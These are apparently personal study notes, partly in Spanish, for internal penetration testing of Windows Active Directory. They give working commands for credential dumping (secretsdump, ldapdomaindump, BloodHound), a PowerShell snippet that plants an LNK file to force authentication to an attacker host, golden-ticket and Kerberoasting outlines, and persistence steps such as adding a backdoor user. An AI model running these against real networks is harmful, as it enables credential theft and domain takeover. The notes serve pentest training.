# Windows Active directory

[**internal pentesting "all the things" notes**](https://swisskyrepo.github.io/InternalAllTheThings/)

## Quick notes

### Attack Vectors
- [LLMNR POISONING](https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332)
    - This is a quick view
    - [Attack tool "Responder"](https://www.kali.org/tools/responder/)
- [SMB Relay Attacks](https://medium.com/@aniswersighni/active-directory-attacks-smb-relay-attacks-ea7d8cf9a8f8)
    - [This guide is a little bit better than the other one](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay)
- [Pass the hash](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key)
- [IPv6 AD Attack (mitm)](https://stridergearhead.medium.com/ipv6-attack-ad-attack-ea50476dccee)
- [Passback attacks](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
- others that i didn't take notes

### Initial internal pentest attack strategy
1. mitm6 or responder
2. run scans to generate traffic
3. if scans are taking too long, look for websites in scope `(http_version)`
4. Look for default credentials on web logins
    - Printers
    - Jenkins
    - Etc
5. enumerate all

### Enumerations commands
- `net user /domain`
- `net user $USER /domain`
- `net group /domain`


### Post-Compromise AD enumeration
- [Bloudhound](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound)
    - `sudo bloodhound-python -d DOMAIN.local -u $USERNAME -p $PASSWORD -ns $IP -c all`
- Plumhound
- Ldapdomaindump
    - `sudo ldapdomaindump ldaps://$IP -u 'DOMAIN\username' -p $PASSWORD`
    - Caso hipotetico de uso: LLMNR => conseguimos un hash => lo crackeamos => probamos la contraseña en otras maquinas => encontramos nuevo login => secrets dump those logins => local admin hashes => re-spray network with local accs
- PingCastle
- etc
- [SeatBelt Tool](https://github.com/GhostPack/Seatbelt)

### Post compromise attacks
- [kali impacket - secrets dump](https://www.kali.org/tools/impacket/)
    - `secretsdump.py DC.LOCAL/USER:'PASSWORD'@$IP` 
- [Kerberoasting](https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast)
    - [más material](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)
    - Cuando comprometemos una cuenta, un ataque para empezar es este.
- Token impersonation attack
    - psexec
    - mimikatz
- [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
    - Código:

    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\test.lnk")
    $lnk.TargetPath = "\\192.168.138.149\@test.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
``` 

### Post compromise attack strategy
- 1st
    - kerberoasting
    - secretsdump
    - pass the hash
- 2nd: big deep
    - enum bloodhound
    - old vulns

### Now we own the domain what's next?
- Provide as much value to the client as possible
    - Put your blinders on and do it again
    - Dump the NTDS.dit and crack passwords
    - Enumarate shares for sensitive information
- Persistence can be important
    - What happens if our DA access is lost?
    - Creating a DA account can be useful (remember we have to delete it)
    - creating a golden ticket can be useful too

#### NTDS.dit
- What is it?
    - A DB used to store AD data.
        - User info.
        - Group info.
        - Security descriptors
        - Password hashes
- Golden Ticket attack
    - When we compromise the krbtgt (kerberos target) account, we own the domain
    - We can request access to any resource or system on the domain
    - Golden tickets = complete access to every machine

### Lateral movement notes
- Tools:
    - Psexec => internal tool
    - WinRM

### Persistence
- **Persistence Scripts**
  - `run persistence -h`
  - `exploit/windows/local/persistence`
  - `exploit/windows/local/registry_persistence`

- **Scheduled Tasks**
  - `run scheduleme`
  - `run schtaskabuse`

- **Add a user**
  - `net user hacker password123 /add`
